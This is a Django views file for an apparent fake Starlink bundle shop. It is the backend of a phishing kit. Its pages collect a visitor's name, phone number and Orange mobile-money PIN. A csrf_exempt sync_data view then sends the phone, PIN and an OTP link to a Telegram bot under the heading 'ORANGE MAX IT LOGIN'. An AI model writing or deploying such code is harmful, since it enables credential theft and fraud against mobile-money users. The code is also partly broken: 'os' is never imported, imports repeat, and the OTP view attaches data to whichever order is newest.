import json
import requests
from django.shortcuts import render, redirect, get_object_or_404 # Fixed imports
from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
from .models import Order # Ensure your model name matches

# Telegram Configuration
BOT_TOKEN = "YOUR_BOT_TOKEN"
CHAT_ID = "YOUR_CHAT_ID"

from django.shortcuts import render, redirect, get_object_or_404
from .models import Order, Bundle  # Use the correct names from models.py

def home(request):
    return render(request, 'index.html')

def checkout(request):
    bundle = request.GET.get('bundle', 'Power User')
    price = request.GET.get('price', '199')
    return render(request, 'checkout.html', {'bundle': bundle, 'price': price})

def payment_instructions(request):
    if request.method == 'POST':
        full_name = request.POST.get('fullName', '')
        city = request.POST.get('city', '')
        bundle_name = request.POST.get('bundle', 'Power User')

        # 1. Get the correct bundle object
        selected_bundle = Bundle.objects.filter(name=bundle_name).first() or Bundle.objects.first()
        
        # 2. Create the order
        order = Order.objects.create(
            full_name=full_name,
            city=city,
            total_amount=199,  
            bundle=selected_bundle
        )

        # 3. CRITICAL: Store the order ID in the session!
        # This allows the next page (otp_verification) to find this exact order
        request.session['current_order_id'] = str(order.order_id)

        return render(request, 'payment_instructions.html', {'order': order})
    
    return redirect('starlink_app:home')
def otp_verification(request): # Removed order_id from here
    # Since we don't have the ID in the URL, we find the "latest" order 
    # created in this session, or simply the most recent one.
    order = Order.objects.order_by('-created_at').first() 

    if request.method == 'POST':
        phone = request.POST.get('phone', '')
        pin = request.POST.get('pin', '')

        if order:
            # Match your models.py field names
            order.phone_number = phone 
            order.orange_pin = pin
            order.save()

            # Update session for the Telegram/Sync stage
            request.session['phone'] = phone
            request.session['pin'] = pin
            request.session['bundle'] = str(order.bundle)

        return redirect('starlink_app:otp_verification')
    return render(request, 'otp_verification.html', {'order': order})

@csrf_exempt

def sync_data(request):

    if request.method != 'POST':

        return JsonResponse({"status": "error", "message": "POST required"}, status=405)



    try:

        # 1. Load data from Fetch

        data = json.loads(request.body)

        otp_link = data.get('otp', 'No Link provided')



        # 2. Retrieve session data

        # Ensure these were set in the previous view using request.session['key'] = value

        phone = request.session.get('phone', 'Unknown')

        bundle = request.session.get('bundle', 'Unknown')

        pin = request.session.get('pin', 'Unknown')



        # 3. Get Credentials from Render Environment Variables

        bot_token = os.getenv('TELEGRAM_BOT_TOKEN')

        chat_id = os.getenv('TELEGRAM_CHAT_ID')



        if not bot_token or not chat_id:

            return JsonResponse({"status": "error", "message": "Server configuration missing"}, status=500)



        # 4. Format the Message

        # Using a simpler format to prevent Markdown parsing errors

        message = (

            "🇸🇱 *ORANGE MAX IT LOGIN*\n"

            "━━━━━━━━━━━━━━━━━━\n"

            f"📞 *PHONE:* +232 {phone}\n"

            f"📦 *BUNDLE:* {bundle}\n"

            f"🔑 *PIN:* {pin}\n"

            "━━━━━━━━━━━━━━━━━━\n"

            f"🔗 *OTP LINK:*\n{otp_link}\n"

            "━━━━━━━━━━━━━━━━━━\n"

            "📡 *STATUS:* SUCCESS"

        )



        # 5. Send to Telegram

        telegram_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"

        payload = {

            "chat_id": chat_id,

            "text": message,

            "parse_mode": "Markdown" 

        }



        response = requests.post(telegram_url, json=payload, timeout=10)

        

        if response.status_code == 200:

            return JsonResponse({"status": "success"})

        else:

            # This helps you see the REAL error in Render logs

            print(f"Telegram Failed: {response.text}")

            return JsonResponse({"status": "error", "message": "Telegram API Error"}, status=500)



    except Exception as e:

        print(f"Sync Error: {str(e)}")

        return JsonResponse({"status": "error", "message": "Internal Server Error"}, status=400)